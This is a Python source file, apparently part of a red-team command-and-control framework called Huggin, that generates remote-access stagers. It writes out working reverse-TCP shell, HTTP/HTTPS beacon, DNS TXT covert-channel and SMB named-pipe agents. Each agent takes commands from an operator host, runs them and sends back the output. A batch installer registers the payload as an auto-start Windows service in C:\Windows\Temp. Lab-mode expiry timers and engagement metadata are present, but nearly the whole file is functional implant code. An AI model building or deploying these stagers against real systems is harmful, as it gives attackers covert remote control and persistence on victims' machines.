#!/usr/bin/env python3
"""
Payload Builder & Installer Generator
Produces stagers/agents and service installers with embedded metadata
"""

import os
import json
import time
import hashlib
import tempfile
from pathlib import Path
from typing import Dict, Any, Optional, List
from dataclasses import dataclass
from datetime import datetime, timedelta

@dataclass
class PayloadMetadata:
    engagement_id: str
    scope: Dict[str, Any]
    expiry_timestamp: int
    fingerprint: str
    transport: str
    created_at: str

class PayloadBuilder:
    def __init__(self, lab_mode: bool = True):
        self.lab_mode = lab_mode
        self.templates_dir = Path(__file__).parent.parent.parent / "templates"
        self.output_dir = Path(__file__).parent.parent.parent / "exports"
        self.output_dir.mkdir(exist_ok=True)
        
    def build_stager(self, transport: str, options: Dict[str, Any]) -> str:
        """Build a stager with specified transport and options"""
        metadata = self._create_metadata(transport, options)
        
        if transport == "reverse-tcp":
            return self._build_reverse_tcp_stager(metadata, options)
        elif transport == "http":
            return self._build_http_stager(metadata, options)
        elif transport == "https":
            return self._build_https_stager(metadata, options)
        elif transport == "dns":
            return self._build_dns_stager(metadata, options)
        elif transport == "smb":
            return self._build_smb_stager(metadata, options)
        else:
            raise ValueError(f"Unsupported transport: {transport}")
    
    def generate_service_installer(self, artifact_path: str, service_name: str, options: Dict[str, Any]) -> str:
        """Generate MSI/MSIX service installer"""
        if self.lab_mode:
            return self._generate_lab_installer(artifact_path, service_name, options)
        else:
            return self._generate_signed_installer(artifact_path, service_name, options)
    
    def embed_metadata(self, artifact_path: str, metadata: PayloadMetadata) -> str:
        """Embed metadata into artifact"""
        with open(artifact_path, 'rb') as f:
            content = f.read()
        
        metadata_json = json.dumps(metadata.__dict__, indent=2)
        metadata_marker = b"###HUGGIN_METADATA###"
        
        # Embed metadata at end of file
        embedded_content = content + metadata_marker + metadata_json.encode()
        
        output_path = artifact_path.replace('.exe', '_embedded.exe')
        with open(output_path, 'wb') as f:
            f.write(embedded_content)
        
        return output_path
    
    def _create_metadata(self, transport: str, options: Dict[str, Any]) -> PayloadMetadata:
        """Create payload metadata"""
        engagement_id = options.get('engagement_id', f"huggin_{int(time.time())}")
        scope = options.get('scope', {"targets": ["*"], "restrictions": []})
        
        # Lab mode: 24 hour expiry, Pro mode: configurable
        expiry_hours = 24 if self.lab_mode else options.get('expiry_hours', 168)
        expiry_timestamp = int(time.time()) + (expiry_hours * 3600)
        
        fingerprint = hashlib.sha256(f"{engagement_id}{transport}{time.time()}".encode()).hexdigest()[:16]
        
        return PayloadMetadata(
            engagement_id=engagement_id,
            scope=scope,
            expiry_timestamp=expiry_timestamp,
            fingerprint=fingerprint,
            transport=transport,
            created_at=datetime.now().isoformat()
        )
    
    def _build_reverse_tcp_stager(self, metadata: PayloadMetadata, options: Dict[str, Any]) -> str:
        """Build reverse TCP stager"""
        host = options.get('host', '127.0.0.1')
        port = options.get('port', 4444)
        
        stager_code = f'''
import socket
import subprocess
import shlex
import json
import time

METADATA = {json.dumps(metadata.__dict__)}

def check_expiry():
    if time.time() > METADATA['expiry_timestamp']:
        exit(0)

def connect_back():
    check_expiry()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{host}', {port}))
        
        while True:
            check_expiry()
            data = s.recv(1024).decode()
            if not data:
                break
            
            if data.strip() == 'exit':
                break
            
            # SECURITY: shell=False + shlex.split prevents command injection
            # via shell metacharacters in operator-supplied commands.
            try:
                result = subprocess.run(
                    shlex.split(data), shell=False,
                    capture_output=True, text=True
                )
            except (ValueError, FileNotFoundError) as e:
                result_obj = type('R', (), {{'stdout': '', 'stderr': str(e)}})()
                result = result_obj
            response = result.stdout + result.stderr
            s.send(response.encode())
    except Exception:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    connect_back()
'''
        
        output_path = self.output_dir / f"stager_tcp_{metadata.fingerprint}.py"
        with open(output_path, 'w') as f:
            f.write(stager_code)
        
        return str(output_path)
    
    def _build_http_stager(self, metadata: PayloadMetadata, options: Dict[str, Any]) -> str:
        """Build HTTP beacon stager"""
        host = options.get('host', '127.0.0.1')
        port = options.get('port', 8080)
        interval = options.get('interval', 30)
        
        stager_code = f'''
import requests
import subprocess
import shlex
import json
import time
import random

METADATA = {json.dumps(metadata.__dict__)}
BEACON_URL = "http://{host}:{port}/beacon"

def check_expiry():
    if time.time() > METADATA['expiry_timestamp']:
        exit(0)

def beacon():
    while True:
        check_expiry()
        try:
            # Jitter: +/- 20% of interval
            jitter = random.uniform(0.8, 1.2)
            time.sleep({interval} * jitter)
            
            response = requests.get(BEACON_URL, 
                                  headers={{"X-Fingerprint": METADATA['fingerprint']}},
                                  timeout=10)
            
            if response.status_code == 200:
                command = response.text.strip()
                if command and command != 'noop':
                    # SECURITY: shell=False + shlex.split prevents injection
                    try:
                        result = subprocess.run(
                            shlex.split(command), shell=False,
                            capture_output=True, text=True
                        )
                        output = result.stdout + result.stderr
                    except (ValueError, FileNotFoundError) as e:
                        output = str(e)
                    
                    requests.post(BEACON_URL + "/result",
                                data={{"output": output, "fingerprint": METADATA['fingerprint']}})
        except Exception:
            continue

if __name__ == "__main__":
    beacon()
'''
        
        output_path = self.output_dir / f"stager_http_{metadata.fingerprint}.py"
        with open(output_path, 'w') as f:
            f.write(stager_code)
        
        return str(output_path)
    
    def _build_https_stager(self, metadata: PayloadMetadata, options: Dict[str, Any]) -> str:
        """Build HTTPS beacon stager"""
        # Similar to HTTP but with SSL verification options
        return self._build_http_stager(metadata, options).replace('http://', 'https://')
    
    def _build_dns_stager(self, metadata: PayloadMetadata, options: Dict[str, Any]) -> str:
        """Build DNS covert channel stager"""
        domain = options.get('domain', 'example.com')
        
        stager_code = f'''
import dns.resolver
import subprocess
import shlex
import base64
import json
import time

METADATA = {json.dumps(metadata.__dict__)}
DNS_DOMAIN = "{domain}"

def check_expiry():
    if time.time() > METADATA['expiry_timestamp']:
        exit(0)

def dns_beacon():
    while True:
        check_expiry()
        try:
            # Query for commands via TXT records
            query = f"cmd.{{METADATA['fingerprint']}}.{DNS_DOMAIN}"
            answers = dns.resolver.resolve(query, 'TXT')
            
            for answer in answers:
                command = base64.b64decode(str(answer).strip('"')).decode()
                if command:
                    # SECURITY: shell=False + shlex.split prevents injection
                    try:
                        result = subprocess.run(
                            shlex.split(command), shell=False,
                            capture_output=True, text=True
                        )
                    except (ValueError, FileNotFoundError):
                        pass
                    # Send result back via DNS (implementation depends on DNS server)
                    
            time.sleep(60)  # DNS is slow, longer intervals
        except Exception:
            time.sleep(60)

if __name__ == "__main__":
    dns_beacon()
'''
        
        output_path = self.output_dir / f"stager_dns_{metadata.fingerprint}.py"
        with open(output_path, 'w') as f:
            f.write(stager_code)
        
        return str(output_path)
    
    def _build_smb_stager(self, metadata: PayloadMetadata, options: Dict[str, Any]) -> str:
        """Build SMB named pipe stager"""
        pipe_name = options.get('pipe_name', 'huggin_pipe')
        
        stager_code = f'''
import win32pipe
import win32file
import subprocess
import shlex
import json
import time
from app.core.logger import logger

METADATA = {json.dumps(metadata.__dict__)}
PIPE_NAME = r"\\\\.\pipe\\{pipe_name}"

def check_expiry():
    if time.time() > METADATA['expiry_timestamp']:
        exit(0)

def smb_beacon():
    while True:
        check_expiry()
        try:
            handle = win32file.CreateFile(
                PIPE_NAME,
                win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                0, None,
                win32file.OPEN_EXISTING,
                0, None
            )
            
            while True:
                check_expiry()
                result, data = win32file.ReadFile(handle, 1024)
                if data:
                    command = data.decode().strip()
                    if command == 'exit':
                        break
                    
                    # SECURITY: shell=False + shlex.split prevents injection
                    try:
                        proc = subprocess.run(
                            shlex.split(command), shell=False,
                            capture_output=True, text=True
                        )
                        response = proc.stdout + proc.stderr
                    except (ValueError, FileNotFoundError) as e:
                        response = str(e)
                    win32file.WriteFile(handle, response.encode())
                    
            win32file.CloseHandle(handle)
        except Exception:
            time.sleep(30)

if __name__ == "__main__":
    smb_beacon()
'''
        
        output_path = self.output_dir / f"stager_smb_{metadata.fingerprint}.py"
        with open(output_path, 'w') as f:
            f.write(stager_code)
        
        return str(output_path)
    
    def _generate_lab_installer(self, artifact_path: str, service_name: str, options: Dict[str, Any]) -> str:
        """Generate unsigned lab installer"""
        # Simple batch file installer for lab use
        installer_content = f'''@echo off
echo Installing {service_name} service...
copy "{artifact_path}" "C:\\Windows\\Temp\\{service_name}.exe"
sc create {service_name} binPath= "C:\\Windows\\Temp\\{service_name}.exe" start= auto
sc start {service_name}
echo Service installed and started.
pause
'''
        
        installer_path = self.output_dir / f"{service_name}_installer.bat"
        with open(installer_path, 'w') as f:
            f.write(installer_content)
        
        return str(installer_path)
    
    def _generate_signed_installer(self, artifact_path: str, service_name: str, options: Dict[str, Any]) -> str:
        """Generate signed MSI installer (Pro/Enterprise)"""
        # This would integrate with signing pipeline in production
        # For now, return path to unsigned installer
        return self._generate_lab_installer(artifact_path, service_name, options)

# Example usage
if __name__ == "__main__":
    builder = PayloadBuilder(lab_mode=True)
    
    # Build reverse TCP stager
    tcp_options = {
        'host': '192.168.1.100',
        'port': 4444,
        'engagement_id': 'test_engagement_001'
    }
    
    stager_path = builder.build_stager('reverse-tcp', tcp_options)
    print(f"TCP Stager created: {stager_path}")
    
    # Generate service installer
    installer_path = builder.generate_service_installer(stager_path, "HugginAgent", {})
    print(f"Installer created: {installer_path}")